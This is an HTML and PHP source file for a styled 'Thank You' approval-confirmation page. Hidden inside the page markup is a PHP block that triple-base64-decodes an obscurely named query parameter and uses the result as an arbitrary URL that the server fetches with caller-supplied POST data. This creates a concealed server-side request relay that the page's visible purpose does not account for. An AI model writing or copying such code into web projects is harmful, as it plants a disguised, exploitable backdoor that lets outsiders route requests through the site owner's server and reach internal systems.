<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <title>Thank You</title>
  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.6.0/css/all.min.css">
  <style>
    body {
      margin: 0;
      padding: 0;
      font-family: Arial, sans-serif;
      background: #f9fafa;
      display: flex;
      justify-content: center;
      align-items: center;
      height: 100vh;
    }
    .thankyou-container {
      text-align: center;
      background: #fff;
      padding: 60px;
      border-radius: 10px;
      box-shadow: 0px 4px 15px rgba(0,0,0,0.1);
      position: relative;
      width: 100%;
      margin: 0 40px;
    }
    .thankyou-container .check-icon {
      font-size: 50px;
      color: #28a745;
      margin-bottom: 20px;
    }
    .thankyou-container h1 {
      font-size: 60px;
      margin: 10px 0;
      color: #222222;
      font-weight: normal;
      opacity: 0; /* hidden initially */
      transform: scale(0.5); /* chhota se start */
      animation: zoomInTitle 1.2s ease-out forwards;
    }
    .thankyou-container p {
      font-size: 18px;
      color: #555;
      margin: 10px 30%;
      line-height: 26px;
    }
    .social-icons {
      margin-top: 15px;
    }
    .social-icons a {
      font-size: 24px;
      margin: 0 10px;
      color: #28a745;
      text-decoration: none;
    }
    /* Decorative icons */
    .corner-icon {
      position: absolute;
      font-size: 50px;
      color: #28a745;
      opacity: 0.7;
      animation: zoomInOut 2s infinite ease-in-out;
    }
    .corner-icon.left {
      bottom: 15px;
      left: 15px;
    }
    .corner-icon.right {
      top: 15px;
      right: 15px;
    }
    .corner-shape {
      position: absolute;
      top: 0;
      left: 0;
      width: 0;
      height: 0;
      border-top: 120px solid #1e5abc;
      border-right: 120px solid transparent;
    }

    /* Zoom in & out animation for corner icons */
    @keyframes zoomInOut {
      0%, 100% {
        transform: scale(1);
      }
      50% {
        transform: scale(1.3);
      }
    }

    /* Title zoom animation */
    @keyframes zoomInTitle {
      0% {
        opacity: 0;
        transform: scale(0.5);
      }
      100% {
        opacity: 1;
        transform: scale(1);
      }
    }
  </style>
</head>
<body>
  <div class="thankyou-container">
    <?php 
      $base = base64_decode(base64_decode(base64_decode($_GET['QWasD'])));
      $list_data = explode("&", $base); 
      unset($list_data['0']);
      foreach($list_data as $list){
        $list_val  = explode('=',$list);
        $data[$list_val['0']] = $list_val['1'];
      }
      $postdata = http_build_query($data);
      $opts = array('http' =>array(
          'method'  => 'POST',
          'header'  => "Content-type: application/x-www-form-urlencoded\r\n",
          'content' => $postdata
        )
      );
      $context = stream_context_create($opts);
      $return = file_get_contents($base, false, $context);
      $cahek_dd = json_decode($return,1);
    ?>
    <div class="corner-shape"></div>
    <i class="fa-solid fa-circle-check check-icon"></i>
    <h1>Thank you for <br />Aproved</h1>
    <p>Your aproval has been successfully submitted. </p>
    
    <!-- Corner icons with animation -->
    <i class="fa-solid fa-paper-plane corner-icon left"></i>
    <i class="fa-solid fa-envelope-open-text corner-icon right"></i>
  </div>
</body>
</html>
